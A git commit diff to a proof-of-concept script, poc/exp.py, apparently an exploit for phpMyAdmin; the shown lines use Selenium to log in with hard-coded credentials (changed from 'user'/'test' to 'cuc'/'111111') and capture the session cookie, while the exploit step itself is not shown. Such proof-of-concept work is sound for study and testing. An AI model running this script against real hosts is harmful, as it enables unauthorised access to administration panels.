39cbef1176b04579e51ea8b4369cc97b404ee830
zhangzhixin <972844082@qq.com>
2020-06-23 09:13:08 +0800

    修改exp登录的用户名和密码

--- poc/exp.py
+++ poc/exp.py
@@ -1,6 +1,6 @@
 import sys
 from selenium import webdriver
-from selenium import webdriver
+
 from selenium.webdriver.support.ui import Select
 from selenium.webdriver.support.wait import WebDriverWait
 from selenium.webdriver.support import expected_conditions as EC
@@ -16,9 +16,9 @@ def exp(host):
     #Select(driver.find_element_by_id("sel-lang ")).select_by_value("zh_cn")
     WebDriverWait(driver, 60).until(EC.visibility_of_element_located((By.ID, 'input_username')))
     driver.find_element_by_id("input_username").clear()
-    driver.find_element_by_id("input_username").send_keys("user")
+    driver.find_element_by_id("input_username").send_keys("cuc")
     driver.find_element_by_id("input_password").clear()
-    driver.find_element_by_id("input_password").send_keys("test")
+    driver.find_element_by_id("input_password").send_keys("111111")
     driver.find_element_by_id("input_go").click()
     cookie = driver.get_cookies()
     phpadmin_session=cookie[1]['value']
@@ -35,5 +35,4 @@ if __name__ == '__main__':
         print('Usage: exp.py host')
         exit(0)
     h = sys.argv[1]
-    print("host is ",h)
     exp(h)
